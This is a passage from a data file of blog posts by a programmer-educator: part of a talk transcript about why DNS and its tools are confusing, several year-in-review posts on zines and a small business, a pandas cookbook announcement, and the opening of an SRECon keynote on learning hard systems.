\n\n \nSo if you look at  this 32-bit\nfloating point number  and click the \"up\" button on the significand, it'll\nshow you the next floating point number, which is 2 more. And then as you make\nthe number bigger and bigger (by increasing the exponent), you can see that the\nfloating point numbers get further and further apart.\n \n\n \nAnyway, this is not a talk about floating point. I could do an entire talk\nabout this site and how we can use it to see how floating point works, but\nthat's not this talk.\n \n\n\n \n \n\n \n \n \n \n \n\n \nAnother thing that makes DNS confusing is that it's a giant distributed system\n-- maybe you're confused because there are 5 million computers involved (really, more!).\nMost of which you have no control over, and some\nare doing not what they're supposed to do. \n \n\n \nSo that's another trick for understanding why things are hard, check to see if\nthere are actually 5 million computers involved.\n \n\n \n \n\n \n \n \n \n \n\n \nSo what else is hard about DNS?\n \n\n \nWe've talked about how most of the system is hidden from you, and about how\nit's a big distributed system.\n \n\n \n \n\n \n \n \n \n \n\nOne problem I've run into is that the tools are confusing.\n\n \n \n\n \n \n \n \n \n\n \nOne of the hidden things I talked about was: the resolver has cached data,\nright? And you might be curious about whether a certain domain name is cached\nor not by your resolver right now.\n \n\n \nJust to understand what's happening:  am I getting this result because it was\ncached? What's the deal?\n \n\n \n\nI said this was hidden, but there are a couple of ways to query a resolver to\nsee what it has cached, and I want to show you one of them.\n\n \n\n\n \n \n\n \n \n \n \n \n\nThe tool I usually use for making DNS queries is called  dig , and\nit has a flag called  +norecurse . You can use it to query a\nresolver and ask it to only return results it already has cached.\n\n \nWith  dig +norecurse jvns.ca , I'm kind of asking -- how popular is my website? Is it popular enough that someone has visited it in the last 5 minutes?\nBecause my records are not cached for that long, only for 5 minutes.\n \n\n \n \n\n \n \n \n \n \n\n\n \nBut when I look at this\nresponse, I feel like \"please! What is all this?\"\n \n\n \nAnd when I show newcomers this output, they often respond by saying \"wow,\nthat's complicated, this DNS thing must be really complicated\". But really this\nis just not a great output format, I think someone just made some relatively\narbitrary choices about how to print this stuff out in the 90s and it's stayed\nthat way ever since.\n \n\n \nSo a bad output format can mislead newcomers into thinking that something is more complicated than it actually is.\n \n\n \n \n\n \n \n \n \n \n\nWhat can we do about confusing output like this?\n\n \n \n\n \n \n \n \n \n\n \nOne of my favorite tricks, I call eraser eyes.\n \n\n \nBecause when I look at that output, I'm not looking at all of it, I'm just\nlooking at a few things. My eyes are ignoring the rest of it.\n \n \n \n\n \n \n \n \n \n\n \nWhen I look at the output, this is what I see: it says  SERVFAIL .\nThat's the DNS response code.\n \n\n\n \nWhich as I understand it is a very unintuitive way of it saying, \"I do not have\nthat in my cache\". So nobody has asked that resolver about my domain name in\nthe last 5 minutes, which isn't very surprising.\n \n\n \nI've learned so much from people doing a little demo of a tool, and showing how\nthey use it and which parts of the output or UI they pay attention to, and which parts they ignore.\n \n\n \nBecuase usually we ignore most of what's on our screens!\n \n\n \nI really love to use  dig  even though it's a little hairy because\nit has a lot of features (I don't know of another DNS debugging that supports this\n +norecurse  trick), it's everywhere, and it hasn't changed in a\nlong time. And I know if I learn its weird output format once I can know that\nforever. Stability is really valuable to me.\n \n\n \n \n\n \n \n \n \n \n\nSo we've talked about these four technologies. Let's talk a little more about\nhow we can make things easier for each other.\n\n \n \n\n \n \n \n \n \n\n\n\nWhat can we do to move folks from \"I really don't get it\" to \"okay, I can\nmostly deal with this, at least 90% of the time, it's fine\"? For bash or HTTP or DNS or anything else.\n\n \n \n\n \n \n \n \n \n\n\n \nWe've talked about some tricks I use to bring people over, like:\n \n\n \n  sharing useful tools  \n  sharing references \n telling a chronological story of what happens on your computer \n turning a big list into a small list of the things you actually use \n showing the hidden things \n demoing a confusing tool and telling folks which parts I pay attention to \n \n\n\n \n \n\n \n \n \n \n \n\n \n\nWhen I practiced this talk, I got some feedback from people saying \"julia! I don't\ndo those things! I don't have a blog, and I'm not going to start one!\"\n\n \n\n \nAnd it's true that most people are probably not going to start programming blogs.\n \n\n \n \n\n \n \n \n \n \n\n\n \nBut I really don't think you need to have a public presence on the internet to\ntell the people around you a little bit about how you use computers and how you\nunderstand them.\n \n\n \n \n\n \n \n \n \n \n\n\n \nMy experience is that a lot of people (who do not have blogs!) have helped me\nunderstand how computers work and have\nshared little pieces of their experience with computers with me.\n \n\n \nI've learned a lot from my friends and my coworkers and honestly a lot of\nrandom strangers on the Internet too. I'm pretty sure some of you here today\nhave helped me over the years, maybe on Twitter or Mastodon.\n \n\n \nSo I want to talk about some archetypes of helpful people\n \n\n \n \n\n \n \n \n \n \n\n \nOne kind of person who has really helped me is the\ngrumpy old-timer. I'll say \"this is so cool\". And they'll reply yes,\nhowever, let me tell you some stories of how this has gone wrong in my life.\n \n\n\n \nAnd those stories have sometimes helped spare me some suffering.\n \n\n \n \n\n \n \n \n \n \n\n \nWe have the loud newbie, who asks questions like \"wait, how does that work?\"\nAnd then everyone else feels relieved -- \"oh, thank god. It's not just me.\"\n \n\n \nI think it's especially valuable when the person who takes the \"loud newbie\"\nrole is actually a pretty senior developer. Because when you're more secure in\nyour position, it's easier to put yourself out there and say \"uh, I don't get\nthis\" because nobody is going to judge you for that and think you're\nincompetent.\n \n\n \nAnd then other people who feel more like they might be judged for not knowing\nsomething can ride along on your coattails.\n \n\n\n \n \n\n \n \n \n \n \n\n \nThen we have the bug chronicler. Who decides \"ok, that bug. This can never happen again\".\n \n\n \n\"I'm gonna make sure we understand what happened. Because I want this to end\nnow.\"\n \n\n \n \n\n \n \n \n \n \n\nWe have the tool builder, whose attitude is more like \"I see people struggling\nwith something, and I don't feel like explaining it. But I can write code to\njust make it easier permanently for everyone.\"\n\n \n \n\n \n \n \n \n \n\nThere's this \"today I learned\" person who's into sharing cool new tools they\nlearned about, a bug that they ran into, or a great new-to-them library feature.\n\n \n \n\n \n \n \n \n \n\nThere's the person who has read the entire Internet and has 700 tabs open. If you\nwant to know where to find something, there's a good chance they already have\nit open in their browser.\n\n\n \n \n\n \n \n \n \n \n\nWe have the person who is just willing to answer questions! \"Yeah, I can tell\nyou how that works!\"\n \n \n\n \n \n \n \n \n\nAnd at the end of all this, sometimes you have someone who likes to write some\nthings down so that other people can read it and can find it later.\n\n\n \n \n\n \n \n \n \n \n\nBut all of us have different roles and we need to work together. I'm into\nwriting but a lof of the stuff I've written about, I only know about because\nsomeone told me about it or explained it to me.\n\n \n \n\n \n \n \n \n \n\nTo end: the one thing I would like to convince you of is: if you're struggling\nwith something that feels basic, it's not just you! You're not alone. We're all struggling with a\nlot of these things that feel like they should be \"basic\".\n\n\n \n \n\n \n \n \n \n \n\nAnd we're struggling with these things for a lot of\nthe same reasons as each other. \n\n\n \n \n\n \n \n \n \n \n\n \nAnd much like when debugging a computer program, when you have a bug, you\nwant to understand why the bug is happening if you're gonna fix it.\n \n\n \nIf we're all struggling with the same things together for the same reasons, if\nwe can figure out what those reasons are, we can do a better job of fixing\nthem.\n \n\n \n \n\n \n \n \n \n \n\nSome of the reasons we've talked about were:\n\n \n \na giant pile of trivia and gotchas.\n \n \nor maybe there's 20 million lines of code somewhere.\n \n \nMaybe a big part of the system is being hidden from you.\n \n \nMaybe the tool's output is extremely confusing and no UI designer has ever worked on improving it\n \n \n\nAnd there are a lot more reasons.\n\n \n \n\n \n \n \n \n \n\nI don't have all the answers for why things are hard. For example I don't really understand why Git is hard, that's something I've been thinking about recently.\n\n \n \n\n \n \n \n \n \n\nBut that's something I'm excited to keep\nworking on and keep trying to figure out.\n\n\n \n \n\n \n \n \n \n \n\n \nAnd that's all I have for you. Thank you.\n \n\n \nI brought some zines to the conference, if you come to the signing later on you can get one.\n \n\n \n \n\n some thanks \n\n This was the last ever Strange Loop and I’m really grateful to Alex Miller and the\nwhole organizing team for making such an incredible conference for so many years. Strange Loop\naccepted one of my first talks ( you can be a kernel hacker ) 9 years ago when I had\nalmost no track record as a speaker so I owe a lot to them. \n\n Thanks to Sumana for coming up with the idea for this talk, and to Marie,\nDanie, Kamal, Alyssa, and Maya for listening to rough drafts of it and helping\nmake it better, and to Dolly, Jesse, and Marco for some of the conversations I\nmentioned. \n\n Also after the conference Nick Fagerland wrote a nice post with thoughts on  why git is hard  in response to my “I\ndon’t know why git is hard” comment and I really appreciated it. It had some\nnew-to-me ideas and I’d love to read more analyses like that. \n\n"},
{"url": "https://jvns.ca/blog/2019-year-in-review/", "title": "2019: Year in review", "content": "\n     \n\n It’s the end of the year again! Here are a few things that happened in 2019.\nI wrote these in  2015 ,\n 2016 ,\n 2017 , and  2018  too. \n\n I have a business instead of a job! \n\n The biggest change this year is that I left my job in August after working\nthere for 5.5 years and now I don’t have a job! Now I have a\n business  (wizard zines). \n\n This has been exciting (I can do anything I want with my time! No rules! Wow!)\nand also disorienting (I can do anything I… want? Wait, what do I want to do\nexactly?). Obviously this is a good problem to have but it’s a big adjustment\nfrom the structure I had when I had a job. \n\n My plan for now is to give myself a year (until August 2020) to see how this\nnew way of existing goes and then reevaluate. \n\n I wanted to write some reflections on my 5 years at Stripe here but it’s been\nsuch a huge part of my life for so long that I couldn’t figure out how to\nsummarize it. I was in a much worse place in my career 6 years ago before I\nstarted working there and it really changed everything for me. \n\n !!Con \n\n 2019 was  !!Con ’s 6th year! It’s a conference about\nthe joy, excitement, and surprise of programming. And !!Con also expanded to\nthe  west coast !! I wasn’t part of organizing the\nwest coast conference at all but I got to attend and it was wonderful. \n\n Running a conference is a ton of work and I feel really lucky to get to do it\nwith such great co-organizers – there have been at least 20 people involved in\norganizing over the years and I only do a small part (right now I organize\nsponsorships for the east coast conference). \n\n This year we also incorporated the  Exclamation Foundation  which is the official entity which\nruns both conferences which is going to make organizing money things a lot easier. \n\n I understand how the business works a little better \n\n Earlier this year I signed up for a business course called\n 30x500  by Amy Hoy and Alex Hillman. They’ve\ninfluenced me a lot this year. Basically I signed up for it because I had a\nbusiness that had made $100,000 in revenue already but I didn’t really\nunderstand how the business  worked  and it felt like it could just evaporate\nat any point. So $2000 (the cost at the time of 30x500) was worth it to help me\nunderstand what was going on. \n\n Amy and Alex both just the other day wrote 100-tweet threads that have some of\nthe ideas that I learned this year in them:  Alex on creating sustainable\nbusinesses  and\n Amy on design . \n\n I was hoping to build a system for selling printed zines in 2019 and I didn’t\nget to it – that’s probably my one concrete business goal for 2020. I tried\nout Lulu for printing in the hopes that I could experiment with print-on-demand\nbut the quality was awful so it’s going to be a bit more work. \n\n blog posts and things \n\n In 2019 I: \n\n \n wrote 29 blog posts \n did some experiments in interactive SQL/server exercises, which I’m excited about but are sort of on the back burner right now. Maybe I’ll go back to them in 2020! \n gave 0 talks (which was a goal of mine) \n \n\n The blog post I’m happiest to have published this year is definitely  Get your\nwork recognized: write a brag document .\nI’ve seen quite a few people saying that it helped them track their work and it\nmakes me really happy. A bunch of people at my old job adopted it and it’s one\nof the non-engineering projects I’m most proud of having done there. \n\n Publishing this post about my  business revenue  was also important\nto me – in the past I loved blogging, but I didn’t think it was possible to\nmake a living by explaining computer things online. And I was totally wrong! It\nis possible! So I think it’s important to tell other people that it’s a possibility. \n\n zines \n\n I published 2  zines : Bite Size Networking and HTTP:\nLearn Your Browser’s Language. And wrote most of a third zine about SQL which\nshould be out in January. \n\n I made the same business  revenue  as in 2018 (which I was thrilled about). \n\n published a box set of my free zines \n\n In August I published a box set of all my free zines with No Starch Press ( Your Linux\nToolbox ,\nit’s in Real Physical Bookstores!!) They did a fantastic job printing it: the\nquality is really really good. I’m very happy with how it turned out. (and if\nyou do buy it and like it, leaving an  amazon review \nhelps me a lot). \n\n And No Starch just told me last week they’ve sold 4000 copies so far and are\nlooking to do a second printing! \n\n Having a Real Traditionally Published Thing out is really cool, I could not\nhave imagined  4 years ago  that\nI could go to an actual bookstore and buy the little 16-page zine I wrote about\nhow much I love strace. \n\n The business aspect of it is interesting – because I’m so used to running a\nbusiness where I sell my own zines, getting 10% in royalties instead of 100%\nfeels strange. But printing and distribution are complicated! And it’s really\ncool that I can say “yeah, go to Barnes & Noble, they’ll have it”! And No\nStarch helped me a lot with picking a good title and cover art! And basically\nthe whole traditional publishing ecosystem just works in a completely different\nway from what I’m used to :) \n\n I think I’ll have a better sense for how to think about traditional publishing\nfrom a business perspective in a year or so after the book has been out for\nlonger. \n\n A big thing I learned from this project is that having zines that are\nprinted in a higher quality way (not just on a home printer) is really nice. \n\n what went well \n\n some things that were good this year: \n\n \n spending time understanding why the business works the way it does instead of\njust guessing \n collaborating with many great people on !!Con to do a big thing together \n publishing the box set! \n I’m happy to have given myself the time/space to do whatever it is I want,\neven though it’s a big adjustment \n writing things that help people a little bit with their careers (the brag\ndocuments post) is nice \n \n\n some things that are harder: \n\n \n I used to have a lot of really amazing coworkers at my job, and right now I’m\nworking much more by myself. I definitely miss having so many great people\nright there to talk to all the time. \n \n\n"},
{"url": "https://jvns.ca/blog/2015/12/26/2015-year-in-review/", "title": "2015: Year in review", "content": "\n     \n\n My awesome friend Monica wrote a  year in review post , so I am writing one too! Here is the programming stuff I did this year. This features zines, pictures, blog posts, talks, and wrists that hurt. \n\n fun: zines! \n\n I wrote  a zine about how much I love strace  and handed it out at a talk I gave. This was a huge success (someone  gave it out to the students of their operating systems class !!!!) 2016 may have more zines. Here’s the front cover: \n\n \n \n \n\n I was thinking of trying to sell it but it felt like too much work. Instead I spent maybe $300 on printing and gave it away for free, since I have a job. You can  print your own copy if you want! . \n\n fun: talks!! \n\n I  opened PyCon 2015  and got to tell 1000 people how great of a conference I think it is. (SO GREAT) \n\n \n \n \n \n \n\n I also gave a talk at PyCon called  Systems programming as a swiss army knife . abstract: “You might think of the Linux kernel as something that only kernel developers need to know about. Not so! It turns out that understanding some basics about kernels and systems programming makes you a better developer, and you can use this knowledge when debugging your normal everyday Python programs.” \n\n I gave out 200 strace zines in the talk and people seemed to love it. Super happy with how that went. A+! Giving talks about systems programming seems to be super delightful. \n\n I gave a talk at Data Day Texas (about the data infrastructure at Stripe) that was okay but not awesome. Giving awesome talks is hard! I’m going to hold off on giving any more talks about work until I have better ideas. \n\n I rejected all invitations to give talks in the second half of 2015 and that was also a great choice. I think I’ll go back to it in 2016! \n\n fun: papers we love! \n\n I went to the  papers we love meetup  in Montreal a few times and it was awesome. Definitely my favorite meetup in the city. The organizers (Julian & Kyla) gave me a paper about  profiling threaded programs  and one about  adversarial inputs to threaded programs  and they both gave me awesome new ideas. I think I’m going to revisit my policy of “never read papers who needs papers not me!”. Possibly to “convince people to print papers and give them to me” =D. \n\n fun: blogging! \n\n Some posts I really enjoyed writing this year: \n\n \n How to trick a neural network into thinking a panda is a vulture\n \n Why you should understand (a little) about TCP \n A millisecond isn’t fast (and how we made it 100x faster)\n \n Nancy Drew and the Case of the Slow Program\n \n How I learned to program in 10 years \n How the locate command works (and let’s write a faster version in one minute!)\n \n \n\n Apparently I like writing about how things work, and how to make computers go fast. I did some fun performance optimization at work. Maybe I will do more of that next year! \n\n Blogging is pretty amazing. Writing down what I’m learning helps me not forget. And sometimes people will comment and say helpful things! For example, I wrote about  writing a TCP stack in Python . In  the comments , tptacek remarked on some things I wrote that he didn’t think were correct, and gave me some good ideas for future learning about TCP. I don’t know how I would have gotten such useful ideas without blogging. \n\n fun: a GAME! \n\n My awesome partner Kamal and I made a game! It’s called  computers are fast  and it helps you get better at understanding computer performance by making you guess how many of a given operation a computer can do in a second. \n\n cool: machine learning REALLY WORKS (so does collaborating) \n\n My job is machine learning. this year I did an ML project from scratch that saved a huge amount of money (like, way more than my salary). \n\n I thought this was really cool not just because of $$$, but because I had this lingering skepticism about the effectiveness of machine learning. Now I really believe when you have a problem that’s well-suited to machine learning, machine learning REALLY WORKS and can make your life awesome. \n\n It was also really awesome to collaborate on it – I worked on it with someone else with a ton of domain expertise, and we were a super amazing team =D =D. At Stripe working on projects on your own is extremely popular and I have no idea why. \n\n I’ve also decided that black box machine learning models that I can’t debug are NOT OKAY. so I’m investing some time in learning about the math behind the ML I do, as well as thinking about tools for debugging models. Not being able to debug is a total disaster. maybe you will hear more about that soon! though, progress on that will be slowed down by… \n\n less fun: wrists that hurt \n\n I was thinking of leaving it at “there’s some awesome stuff. everything is awesome!”. But instead, let’s talk about less-awesome stuff! My wrists have been hurting me when I type all year. This sucks. I type a lot, and I work remote, where most of my communication is by typing. \n\n I found out that when my wrists hurt and I have a job, there are basically two options \n\n \n do things that don’t involve typing \n type anyway \n \n\n mostly I picked option 2) this year. this is not good for all kinds of reasons that are easy to imagine. I made some progress (ergonomics help! not typing helps! massages help!) but overall it’s been a bad year. @beerops has a  great post about ergonomics which I love . The thing I learned about ergonomics this year is that you don’t do it because it’s fun, you do it because you don’t want to be in pain all the time :). \n\n I’m supposed to go back to work in a week and my wrists still hurt. I have all kinds of awesome ideas for what to do at work, and they mostly involve a lot of typing. Gonna need to do better there =) \n\n fun: drawing comics! \n\n I didn’t blog for a few months because my wrists were a mess. But I found a fun thing to do instead! Here are a bunch of comics / mini twitter essays I wrote down and tweeted. I like them quite a bit. you can click on them to see a bigger version, and sometimes some discussion. they are popular tweets which is always fun. \n\n Here are my 6 favorites! \n\n \n\n \n \n machine learning for math majors \n \n \n \n \n \n\n \n \n how to be a wizard programmer \n \n \n \n \n \n\n \n \n why open source is hard \n \n \n \n \n \n\n \n \n why you should hire junior developers \n \n \n \n \n \n\n \n \n an awesome trick for giving good feedback \n \n \n \n \n \n\n \n \n data analysis is always more work than you think \n \n \n \n \n \n\n \nand a couple more! They’re all  here somewhere  – maybe I’ll put them somewhere more coherent soon.\n\n \n \n some ways to use data unethically \n \n \n \n \n \n\n \n \n is machine learning safe to use? \n \n \n \n \n \n\n some conclusions \n\n what worked: learning  how things work ! building things I think are fun! collaborating on projects at work! (the most successful thing I did was a collaboration. a++ not working alone) giving talks! not giving talks! reading papers occasionally! \n\n what did not work: pretending that I do not have a body. \n\n doing important things \n\n One good thing about wrist pain: it helps focus me a little. I’m less likely to work on things that aren’t important! If spending 3 hours typing hurts, it makes no sense to work on something in that time that doesn’t matter. There are so many important things in the world to work on, and I think I’m getting slightly better at working on them. \n\n In 2016 I’d like to do more things that matter. \n\n"},
{"url": "https://jvns.ca/blog/2016/10/31/service-discovery-at-stripe/", "title": "Service discovery at Stripe", "content": "\n      I work at Stripe. I’ve been writing on this blog the whole time I’ve worked there\n(going on 3 years), but today for the first time I published a blog\npost on the Stripe blog. I’m happy with how it turned out. (it has an\nadorable comic with servers gossiping about each other in it!) \n\n I’m happy I work with so many people who will answer my questions and\nexplain things. I’ve learned a lot.\nIn particular  nelhage  explained practically everything\nin this post to me. \n\n Here’s the post:  Service discovery at Stripe \n\n"},
{"url": "https://jvns.ca/blog/2021/12/31/2021--year-in-review/", "title": "2021: Year in review", "content": "\n     \n\n It’s the end of the year again! This was my second full year working for myself\non  wizard zines . \n\n Here are some thoughts about what I’m working towards, a bunch of things I made\nthis year, and a few ideas and questions about 2022. \n\n made some progress on a “mission statement” \n\n I think the two hardest things about working for myself are working alone and\nhaving to decide what to do. \n\n This year I spent some time trying to figure out what I’m doing with wizard\nzines. This is hard for me because I work in a pretty intuitive way – I have\nsome feelings about what’s important, and even though following my feelings\nusually turns out well, I can’t always explain what I’m trying to do. \n\n Here are some thoughts about what I’m trying to do: \n\n \n I’m only interested in explaining “old” established technologies (HTTP, DNS, assembly, C, etc) \n I want to help people who are learning about these “old” things for the first time today (whether they’re new to programming or just new to the thing) \n I think it’s very important to learn through experimentation and actually using the thing \n There’s a lot of hidden knowledge about these “old” tools (what are they used\nfor? what are the common mistakes? which parts can you ignore?). I want to\nmake that knowledge easy to find. \n \n\n There’s also something which I can’t quite articulate yet, which is that\ncomputers were “simpler” in the past, and that it’s still possible in 2022 to\nlearn programming in a “simpler” way and cut through some of the chaos and\nchurn in modern computing. \n\n As stated this sounds unrealistic, because you do need to use a lot of more\n“complicated” stuff to get things done in a real programming job. Most people\ncan’t avoid it! But understanding the “simple” core of how computers work\nreally gives me a lot more confidence when dealing with all of the chaos. (“I\ndon’t know what all this nonsense is but at the end of the day it’s all just\nassembly instructions and memory and system calls, I can figure this out”) \n\n So I guess I want to figure out how to help other people move towards that\nconfidence of “ok, I know how this computer stuff works, I can figure out any\nweird new nonsense you throw at me”. That seems ambitious and it might be\nunrealistic for a collection of a few zines and and blog posts and websites but\nit feels important to me. \n\n educational websites! \n\n This year I felt more excited about making websites than making zines and so I\nspent more time building websites than I did writing zines. I think this is\nbecause: \n\n \n the way I learn things is by  doing , not by reading \n I feel really comfortable experimenting and breaking things on my computer,\nbut I get the impression that not everyone feels the same level of comfort \n writing code is fun \n \n\n I’m not going to write about each project at length here because I already\nwrote long blog posts about each one, but here’s a list of all of the\neducational websites I made this year (and one command line tool): \n\n \n mysteries.wizardzines.com  ( blog post ), a choose-your-own-adventure debugging game \n nginx playground  ( blog post ), where you can do nginx experiments \n mess with dns  ( blog post ), where you can do DNS experiments. I built this one with  Marie Claire LeBlanc Flanagan . \n dnspeep  ( blog post ), a command line tool for spying on your DNS queries \n a simple dns lookup tool  ( blog post ), a friendly website version of  dig \n what happens behind the scenes when you make a DNS query , a friendly website version of  dig +trace \n a sort of “linux challenges” site that I  wrote about a lot  but haven’t released yet \n \n\n As you can tell, a lot of them are related to DNS :) \n\n collaboration! \n\n My biggest problem with working for myself is that it gets lonely sometimes,\nand in previous years I haven’t been very good at finding collaborators.\nThis year I got to work with  Marie  on\n Mess With DNS . It was a lot more fun (and a lot\neasier!) than building it by myself would have been. \n\n opened a print zine store! \n\n I finally (after several years of struggling to figure it out) opened an\n online store  that sells print versions of my zines in May. \n\n Unlike my previous artisanal attempts where I did all the shipping myself\n(which was kind of fun but totally unsustainable), this time an amazing company\ncalled White Squirrel is handling the shipping. \n\n Setting this up involved a lot of logistics (I just finished figuring out how\nto handle EU VAT for example), but now that it’s set up it doesn’t need too\nmuch ongoing attention except to answer occasional emails from people who run\ninto shipping problems. \n\n put all of my comics online! \n\n I put all of my comics online in one place at  https://wizardzines.com/comics .\nHere’s a  blog post about that . I’m really happy about this and it’s amazing to be able to just link to any comic I want (like  grep ). \n\n some partial zines! \n\n I worked on a few zine ideas this year but did not finish any. Here are some bits and pieces that I wrote this year. \n\n Some pages from a DNS zine draft: \n\n \n why updating DNS is slow \n the 4 types of DNS servers \n CNAME records \n DNS record types \n why we need DNS \n subdomains \n top-level domains \n \n\n I also worked on a zine about debugging that I’ve been writing on and off since\n2019. Here are some pages I wrote in this year’s attempt:  (you can find more by searching for “debugging” at  https://wizardzines.com/comics ) \n\n \n track your progress \n guesses are often wrong \n why some bugs feel “impossible” \n make a minimal reproduction \n list what you’ve learned \n this flowchart \n “we think about debugging as a technical skill (and it absolutely is!!) but a\nhuge amount of it is managing your feelings so you don’t get discouraged and\nbeing self-aware so you can recognize your incorrect assumptions” (this was just a tweet, not a comic)\n \n \n\n I also wrote 3 pages about how things are represented in memory ( hexadecimal ,  little-endian ,  bytes ), but there’s a very long way to go on that project. \n\n I got stuck writing these for the reason I usually get stuck finishing zines –\nI need to have a clear explanation in my mind of what the zine is about. The\nexplanation looks something like “the reason many people struggle with TOPIC is\nbecause they don’t understand X, here’s what you need to know”. My first guess\nat what “X” is often wrong, and the farther I am away from learning the topic\nfor the first time myself the more wrong I am. \n\n But I have some thoughts about how to get unstuck, we’ll see what happens! \n\n blog posts! \n\n here are some of blog posts I wrote this year, by category: \n\n “how things work”: \n\n \n The OSI model doesn’t map well to TCP/IP \n DNS “propagation” is actually caches expiring \n Quadratic algorithms are slow (and hashmaps are fast) \n \n\n “how to use X tool”: \n\n \n What problems do people solve with strace? \n How to look at the stack with gdb \n Tools to Explore BGP \n Some notes on using esbuild \n Firecracker: Start a VM in less than a second \n Docker Compose: a nice way to set up a dev environment \n \n\n meta-posts about learning and writing: \n\n \n Get better at programming by learning how things work \n Blog about what you’ve struggled with \n Patterns in confusing explanations \n Write good examples by starting with real code \n How to get useful answers to your questions \n Teaching by filling in knowledge gaps  (this one was really helpful for me to write to articulate to myself what I’m trying to do) \n \n\n debugging: \n\n \n Why bugs might feel “impossible” \n Debugging by starting a REPL at a breakpoint is fun \n Debugging a weird ‘file not found’ error \n \n\n I’ve historically had a “never write anything negative” rule for this blog and\nI’m trying to back off that a little bit because it feels limiting.\nSpecifically the posts on  dns propagation ,  the osi model , and  confusing explanations  are a little more\nnegative than what I would have written previously, and I think they’re better\nbecause of it. \n\n Looking at this list, maybe I want to write more hands-on “how things work” / “how to use X tool” posts next year. \n\n Also, I see people linking to  Get your work recognized: write a brag document (from 2019)  on Twitter all the time. I’m\nvery happy it’s still helping people. \n\n the business is doing well! \n\n This past year I released a lot of free things and not as many things that cost\nmoney, but the business is doing well nonetheless and I’m happy about that. \n\n All of the work in this post continues to be 100% funded by zine sales, which\nI’m grateful for. \n\n things I might do in 2022 \n\n Here are some things I might do in 2022. I write these because it’s interesting\nto see at the end of the year which ones happened and which ones didn’t. \n\n \n keep working with other people. \n try to finish some zines \n make more websites where people can do computer experiments \n figure out where to take the  computer mysteries  project \n give a talk (I’ve taken 3 years off writing talks, but I have some ideas) \n try to understand what’s going on with this “mission statement” \n \n\n some things I’m less likely to do, but that I’ve thought about: \n\n \n write an actual book (for example a book about computer networking) \n write some computer networking command line tools that are easier to use \n collaborate with someone to write a zine about a topic that I know almost nothing about (like databases) \n spend more (than 0) time reading papers about CS education \n \n\n some questions \n\n Here are some questions I have going into 2022. \n\n \n What’s the scope of the “zines” project? How many more do I want to write? \n What’s hard for developers about learning to use the Unix command line in 2021? What do I want to do about it? \n If I keep making these educational websites, how can/should I measure how much they’re used? (I’m thinking here about  this paper  by Philip Guo about  python tutor ’s design guidelines) \n Do any of my educational websites need to make money, or can I keep releasing them for free? \n \n\n"},
{"url": "https://jvns.ca/blog/2013/12/22/cooking-with-pandas/", "title": "A pandas cookbook", "content": "\n      A few people have told me recently that they find the slides for my\ntalks really helpful for getting started with\n pandas , a Python library for manipulating\ndata. But then they get out of date, and it’s tough to support slides\nfor a talk that I gave a year ago. \n\n So I was procrastinating packing to leave New York yesterday, and I\nstarted writing up some examples, with explanations! A lot of them are\ntaken from talks I’ve given, but I also want to give some new\nexamples, like \n\n \n how to deal with timestamps \n what is a pivot table and why would you ever want one? \n how to deal with “big” data \n \n\n I’ve put it in a GitHub repository called\n pandas-cookbook . It’s along\nthe same lines as the pandas talks I’ve given – take a real dataset\nor three, play around with it, and learn how to use pandas along the\nway. \n\n Here’s the current table of contents, as of right now. These links\nwill probably break as I update it. \n\n \n Chapter 1: Reading from a CSV \n Chapter 2: Selecting data & finding the most common complaint type \n Chapter 3: Which borough has the most noise complaints? (or, more selecting data) \n Chapter 4: Find out on which weekday people bike the most with groupby and aggregate \n Chapter 5: Combining dataframes and scraping Canadian weather data \n Chapter 6: String operations! Which month was the snowiest? \n Chapter 7: Cleaning up messy data \n Chapter 8: Parsing Unix timestamps \n \n\n"},
{"url": "https://jvns.ca/blog/so-you-want-to-be-a-wizard/", "title": "So you want to be a wizard", "content": "\n     \n\n Today I did the opening keynote at SRECon. This talk was a little less technical than my normal talks: instead of talking about tools like tcpdump (though tcpdump makes an appearance!), I wanted to talk about how to make a career where you’re constantly learning and how to be good at your job whether or not you’re the most experienced person. \n\n Here’s the video, talk abstract, then the slides & a rough transcript. I’ve included links to every resource I mentioned. \n\n video \n\n source: usenix’s website \n\n \n\n abstract \n\n \nI don't always feel like a wizard. I'm not the most experienced member on my team, like most people I sometimes find my work difficult, and I still have a TON TO LEARN.\n \n\nBut along the way, I have learned a few ways to debug tricky problems, get the information I need from my colleagues, and get my job done. We're going to talk about\n \n\n \n \n how asking dumb questions is actually a superpower\n \n \nhow you can read the source code to programs when all other avenues fail\n \n \ndebugging tools that make you FEEL like a wizard\n \n \nand how understanding what your _organization_ needs \ncan make you amazing\n \n \n\nAt the end, we'll have a better understanding of how you can get a lot of awesome stuff done even when you're not the highest level wizard on your team.\n\n \n\n \n.container{display:flex;}\n.slide{\nwidth:40%;\nborder-bottom: 2px #ccc dashed;\npadding: 10px 0px;\n}\n.content{\n    width:60%;\n    align-items:center;\npadding:20px;\n}\n@media (max-width: 480px) \n{\n.container{display:block;}\n.slide{width:100%;}\n.content{width:100%;}\n}\n \n\n So you want to be a wizard \n\n (this transcript is nowhere near totally faithful; there’s a fair amount of “what i meant to say / what I said, kind of, I think” in here :) ) \n\n You can click on any of the slides to see a bigger version. \n\n \n \n \n \n \n\n\n \n \n\n \n \n \n \n \n\nThis talk is called \"so you want to be a wizard\". The main problem with being a wizard is that, of course, computers are not magic! They are logical machines that you can totally learn to understand.\n\n \n \n\n \n \n \n \n \n\nSo this talk is actually going to be about learning hard things and understanding complicated systems.\n\n \n \n\n \n \n \n \n \n\nI work as an engineer at  Stripe . (this is the  job description for my job ).\n\n \n \n\n \n \n \n \n \n\nMy team is in charge of a ton of things. Every so often I find out about a new thing that we're in charge of (\"oh, there's a GPG keyserver we depend on? Okay!!\")\n\n \n \n\n \n \n \n \n \n\nWhat this means is that I (like many of you!) need to know about a ton of different systems. There are about a million things to know about Linux & networking, the AWS platform is really complicated and there's a ton to know about how it works exactly.  \n\nAnd there's a seemingly neverending amount of new technology to learn about. For instance we're looking at Kubernetes, and to operate a Kubernetes cluster you need to operate etcd, which means that you need to understand a bunch of distributed systems concepts to make sure you're doing it right.\n\n \n \n\n \n \n \n \n \n\n\nSo to do my job effectively, like many of you, I need to constantly learn new things. This talk is about how to do that, and why I like it.\n\n \n \n\n \n \n \n \n \n\nHere are the wizard skills we're going to be discussing in this talk!\n\n \n \n\n \n \n \n \n \n\n\n \n \n\n \n \n \n \n \n\nIn software engineering, I think it's really important to understand both the systems that are a little higher-level than you and lower-level systems. \n\nIn reliability engineering, what lives below us is typically \"systems stuff\" like operating systems & networking. Above us is stuff like business requirements & the programs we're trying to make run reliably.\n \n\nThis talk is mostly going to be about understanding lower-level systems, but we're also going to talk a little about humans and how to make sure you're actually building the right thing :)\n\n\n \n 